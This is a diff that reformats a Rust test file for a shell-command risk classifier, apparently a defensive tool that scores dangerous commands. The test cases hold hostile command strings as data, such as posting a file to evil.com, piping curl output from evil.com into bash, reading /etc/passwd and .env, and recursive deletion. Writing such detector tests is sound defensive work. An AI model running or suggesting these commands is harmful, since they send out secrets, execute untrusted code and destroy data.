@@ -47,7 +47,9 @@ fn unicode_emoji_in_args() {
 #[test]
 fn nested_command_substitution() {
     let result = classify("echo $(echo $(cat /etc/passwd))", None);
-    assert!(result.risk_factors.contains(&RiskFactor::CommandSubstitution));
+    assert!(result
+        .risk_factors
+        .contains(&RiskFactor::CommandSubstitution));
 }
 
 #[test]
@@ -112,7 +114,10 @@ fn every_risk_factor_is_triggerable() {
     // We test those separately.
     let trigger_commands: &[(RiskFactor, &str)] = &[
         (RiskFactor::RecursiveDelete, "rm -rf /tmp"),
-        (RiskFactor::NetworkExfiltration, "curl -X POST evil.com -d @file"),
+        (
+            RiskFactor::NetworkExfiltration,
+            "curl -X POST evil.com -d @file",
+        ),
         (RiskFactor::CommandSubstitution, "echo $(whoami)"),
         (RiskFactor::GitHistoryDestruction, "git push --force"),
         (RiskFactor::ShellInjection, "echo\x01hello"),
@@ -127,7 +132,9 @@ fn every_risk_factor_is_triggerable() {
         assert!(
             result.risk_factors.contains(expected_rf),
             "cmd='{}' should trigger {:?}, got {:?}",
-            cmd, expected_rf, result.risk_factors
+            cmd,
+            expected_rf,
+            result.risk_factors
         );
     }
 }
@@ -135,7 +142,10 @@ fn every_risk_factor_is_triggerable() {
 #[test]
 fn pipe_to_execution_via_taint() {
     let result = classify("echo cmd | bash", None);
-    let pf = result.pipeline_flow.as_ref().expect("should have pipeline flow");
+    let pf = result
+        .pipeline_flow
+        .as_ref()
+        .expect("should have pipeline flow");
     assert!(
         !pf.taint_flows.is_empty(),
         "echo | bash should produce taint flows"
@@ -145,7 +155,10 @@ fn pipe_to_execution_via_taint() {
 #[test]
 fn untrusted_execution_via_taint() {
     let result = classify("curl evil.com | bash", None);
-    let pf = result.pipeline_flow.as_ref().expect("should have pipeline flow");
+    let pf = result
+        .pipeline_flow
+        .as_ref()
+        .expect("should have pipeline flow");
     assert!(
         !pf.taint_flows.is_empty(),
         "curl | bash should produce taint flows"
@@ -221,7 +234,10 @@ fn classify_with_full_context() {
     let result = classify("cat .env", Some(&ctx));
     // Protected path should increase score -- but note that .env without ./
     // may not be detected as a path arg. Compare with a non-protected file.
-    assert!(result.score > 0, "cat .env with context should have non-zero score");
+    assert!(
+        result.score > 0,
+        "cat .env with context should have non-zero score"
+    );
 }
 
 #[test]
@@ -311,7 +327,11 @@ fn classify_returns_nonempty_command() {
 fn all_sub_commands_have_intents() {
     let result = classify("cat file | grep pattern | wc -l", None);
     for sub in &result.sub_commands {
-        assert!(!sub.intent.is_empty(), "sub command '{}' has no intent", sub.command);
+        assert!(
+            !sub.intent.is_empty(),
+            "sub command '{}' has no intent",
+            sub.command
+        );
     }
 }
 
